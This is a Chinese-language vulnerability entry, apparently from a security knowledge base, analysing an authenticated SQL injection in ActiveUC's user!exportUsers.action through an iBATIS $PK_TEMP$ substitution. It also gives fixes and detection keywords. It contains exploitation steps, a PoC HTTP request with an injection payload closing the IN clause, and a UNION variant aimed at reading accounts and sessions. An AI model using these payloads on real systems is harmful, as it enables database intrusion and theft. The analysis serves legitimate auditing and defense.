---
id: web-java-component-activeuc-exportusers-ibatis-dollar-sqli
title: 网动 ActiveUC user!exportUsers 登录后 iBATIS $ 拼接 SQL 注入（temps → PK_TEMP IN）
type: scenario
domain: web
path: web/java/component
technique: activeuc-exportusers-ibatis-dollar-sqli
tags:
- java
- activeuc
- struts2
- sqli
- ibatis
- authenticated
- component
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:12:03+08:00'
  notes: 已对照原文核对；$PK_TEMP$ 文本替换、temps 去尾字符后进入 IN 列表与截图一致；原文仅源码分析，未给可执行注入 payload。
url: /docs/web/java/component/web-java-component-activeuc-exportusers-ibatis-dollar-sqli/
draft: false
kb_aliases:
- ActiveUC SQL 注入
- iBATIS $ 注入
- UserImportTemp.xml
- listUserImportTempByTemps
- PK_TEMP IN 注入
- 网动统一通信平台
---

## 一句话结论

ActiveUC 的 `user!exportUsers.action` 把请求参数 `temps` 传给 `UserService.writeUserXls`，最终进入 iBATIS 映射 `UserImportTemp.xml` 的 `listUserImportTempByTemps`；该语句用 `$PK_TEMP$` 做字符串替换（不是 `#` 预编译占位），`WHERE PK_TEMP IN ($PK_TEMP$)` 直接拼接用户输入，登录后可构造 SQL 注入。

## 原理

- **iBATIS 的 `$` 与 `#`**：`#` 生成 JDBC 预编译占位符，值作为参数绑定；`$` 是文本替换，在 SQL 生成前把字符串原样拼进去。`UserImportTemp.xml` 中：
  ```xml
  <select id="listUserImportTempByTemps" parameterClass="java.util.HashMap" resultClass="java.util.HashMap">
    SELECT * FROM tbl_user_import_temp
    <isNotNull property="PK_TEMP">
      WHERE PK_TEMP IN ($PK_TEMP$)
    </isNotNull>
    ORDER BY ORDER_NUM DESC, PK_TEMP
  </select>
  ```
  `$PK_TEMP$` 可控即 SQL 注入。
- **入口**：`UserAction.exportUsers()`：
  ```java
  long deptId = this.getLongParameter("IA_DEPTID", 0L);
  String temps = this.getParameter("temps", "");
  List<CIADBRecordEntry> userList = this.userService.getExportUser(deptId, true, null);
  this.userService.writeUserXls(userList, this.response, temps);
  ```
  `temps` 完全来自请求参数。
- **拼接过程**：`writeUserXls(..., String temps)` 先 `temps = temps.substring(0, temps.length() - 1)`（去掉最后一个字符，通常客户端会多传一个分隔符），再 `params.put("IA_PK_TEMP", temps)`，调用 `queryOpt("listUserImportTempByTemps", params)`；`IA_PK_TEMP` 被 `$PK_TEMP$` 替换进 `IN (...)`。
- **鉴权**：Action `user!*` 位于 `user` package，`extends="globalAndVerify"`，默认拦截器栈含 `VerifyLogInfoInterceptor`（检查 session 的 `logonInfo`），因此需要登录会话；不是前台未授权漏洞。
- **同类面**：全局搜索 `$` 还命中 `Meeting.xml`、`Sms.xml` 等（如 `INSERT ... (${columnName[]})`），说明项目多处使用 iBATIS `$` 拼接；本文只分析 `UserImportTemp.xml` 一处。
- **为什么能注入**：`IN ($PK_TEMP$)` 的括号和 `WHERE` 结构由模板提供，攻击者可以在 `temps` 中闭合括号、追加 `UNION SELECT`/布尔/时间条件，或构造子查询；`substring` 只去掉最后一个字符，不影响注入。

## 触发条件

- 目标为 ActiveUC，存在 `UserAction.exportUsers` 与 `UserImportTemp.xml` 的 `listUserImportTempByTemps`。
- 攻击者拥有有效登录会话（`logonInfo`），能访问 `user!exportUsers.action`。
- `temps` 参数未做数字/逗号白名单校验，直接进入 `$PK_TEMP$`。
- 数据库账户有对应表的查询权限；iBATIS 版本按 `$` 文本替换处理（默认行为）。

## 利用步骤

1. 登录获取有效 `JSESSIONID`（`logonInfo` 会话）。
2. 访问 `user!exportUsers.action`，先传 `temps=1,` 观察正常导出，确认参数进入 `IN` 列表。
3. 构造注入：闭合 `IN` 的括号并追加 `UNION SELECT`/布尔条件；注意 `writeUserXls` 会去掉最后一个字符，payload 末尾要多留一个字符（如逗号）。
4. 按导出文件/响应差异判断注入结果；无回显时用时间盲注或报错注入。
5. 读取数据库中的账号、配置、会话等信息，评估进一步利用。

## PoC

请求骨架（原文未给出可直接执行的注入 payload，以下为按模板构造的示意）：

```http
POST /acenter/user!exportUsers.action HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效会话>
Content-Type: application/x-www-form-urlencoded

IA_DEPTID=0&temps=1) AND 1=1--,
```

`writeUserXls` 去掉末尾逗号后，模板变成：

```sql
SELECT * FROM tbl_user_import_temp
WHERE PK_TEMP IN (1) AND 1=1--)
ORDER BY ORDER_NUM DESC, PK_TEMP
```

UNION 形态（列数需按实际表调整）：

```text
temps=1) UNION SELECT ... FROM ...--,
```

关键源码：

```java
// UserAction.exportUsers
String temps = this.getParameter("temps", "");
this.userService.writeUserXls(userList, this.response, temps);

// UserService.writeUserXls
if (temps != null && !"".equals(temps)) {
    temps = temps.substring(0, temps.length() - 1);
    HashMap<String, String> params = new HashMap<>();
    params.put("IA_PK_TEMP", temps);
    List<CIADBRecordEntry> tempList =
        this.global.iaIbatisOpt.queryOpt("listUserImportTempByTemps", params);
}
```

```xml
<select id="listUserImportTempByTemps" parameterClass="java.util.HashMap" resultClass="java.util.HashMap">
  SELECT * FROM tbl_user_import_temp
  <isNotNull property="PK_TEMP">
    WHERE PK_TEMP IN ($PK_TEMP$)
  </isNotNull>
  ORDER BY ORDER_NUM DESC, PK_TEMP
</select>
```

## 变体与关联

- 同项目其它 iBATIS `$` 拼接点：`Meeting.xml`、`Sms.xml` 的 `${columnName}`/`${columnName[]}`，可按同样方式审计。
- 注入位置在 `IN` 列表，适合 UNION/布尔/时间盲注；若导出文件可下载，可把查询结果直接带出。
- 需要登录，可结合弱口令/默认账号/会话固定等入口获取会话。
- 关联：[[web-java-component-jimureport-queryfieldbysql-time-blind-sqli]]（同类 Java 报表 SQL 注入）。
- 关联：[[web-java-framework-jeecgboot-dict-filter-sql-injection]]（Java 框架 SQL 注入与过滤绕过）。

## 检测与防御

- 把 `$PK_TEMP$` 改为 `#PK_TEMP#` 预编译参数；`IN` 列表应拆分数组后用 `#` 逐个绑定，或使用 `foreach` 生成占位符。
- 对 `temps` 做严格校验：仅允许数字与逗号，校验每段为整数并限制数量。
- 全局排查 iBATIS XML 中的 `$` 拼接，尤其是 `${columnName}` 这类表名/列名拼接；无法参数化的标识符要用白名单。
- 数据库账户最小权限；导出功能加权限控制与审计。
- 监控 `user!exportUsers.action` 中 `temps` 含 `)`, `'`, `--`, `UNION`, `AND`, `OR`, `SLEEP` 等特征；关注异常导出文件大小与查询延迟。
